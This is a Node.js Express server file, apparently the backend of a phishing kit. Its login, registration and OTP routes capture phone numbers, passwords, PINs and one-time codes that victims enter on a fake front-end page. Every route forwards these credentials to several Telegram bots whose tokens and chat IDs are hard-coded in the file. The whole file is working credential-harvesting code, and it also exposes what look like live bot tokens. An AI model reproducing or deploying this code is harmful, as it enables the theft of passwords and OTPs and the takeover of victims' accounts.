const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const path = require('path');

const app = express();

// --- CONFIGURATION ---
// Yahan teeno bots ke tokens aur chat IDs daalein
const BOTS_CONFIG = [
  { token: '9145643511:AAHqvRo7R_GU4pguErNEdkEPMvnZA8RKvjo', chatId: '7874893207' },
  { token: '9156778605:AAHPfoOXI4ACUUGN_mu5hNzaSsfBLaRcVUw', chatId: '7874893207' },
  { token: '9210037057:AAE61H9muBSZvGsxWNlp_bU4f_bhoGGVwBk', chatId: '8699992447' },
  { token: '9062212871:AAEJR7mws7be9NSL8XzAU_rKFPw8z5CmPKM', chatId: '8940054842' },
  { token: 'TOKEN_BOT_5', chatId: 'CHAT_ID_5' }
];

// Saare bots ko ek array mein initialize karein
const bots = BOTS_CONFIG.map(config => ({
  bot: new TelegramBot(config.token, { polling: false }),
  chatId: config.chatId
}));

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

// Helper function jo teeno bots ko message bhejega
async function sendToAllBots(title, data) {
    try {
        let message = `*${title}*\n\n`;
        for (const [key, value] of Object.entries(data)) {
            message += `*${key}:* ${value}\n`;
        }

        console.log("Attempting to send message to bots...");

        const results = await Promise.allSettled(bots.map(item =>
            item.bot.sendMessage(item.chatId, message, { parse_mode: 'Markdown' })
        ));

        results.forEach((res, index) => {
            if (res.status === 'fulfilled') {
                console.log(`Bot ${index + 1}: Success ✅`);
            } else {
                console.error(`Bot ${index + 1}: Failed ❌`, res.reason);
            }
        });

        return { ok: true };
    } catch (e) {
        console.error("Global Telegram Error:", e);
        return { ok: false, error: e.message };
    }
}

// --- ROUTES ---

app.post('/api/login', async (req, res) => {
    try {
        const { phone, password } = req.body;
        await sendToAllBots('🔑 Login Attempt', { Phone: phone, Password: password });
        res.status(200).json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false });
    }
});

app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        const result = await sendToAllBots('📝 Registration Request', {
            Username: data.username || 'N/A',
            Password: data.password,
            PIN: data.pin || 'N/A',
            Phone: data.phone,
            Invite: data.invite || 'None',
            Timestamp: new Date().toLocaleString()
        });
        res.status(200).json({ ok: result.ok });
    } catch (e) {
        res.status(500).json({ ok: false, error: 'Internal Server Error' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const result = await sendToAllBots('🔄 OTP Resend', { Phone: phone });
        res.status(200).json({ ok: result.ok });
    } catch (e) {
        res.status(500).json({ ok: false, error: 'Internal Server Error' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { phone, otp, type } = req.body;
        const title = type === 'login' ? '🔐 Login OTP Received' : '⚠️ Registration OTP Received';

        await sendToAllBots(title, { Phone: phone, OTP: otp });
        res.status(200).json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: 'Internal Server Error' });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

module.exports = app;

if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
}
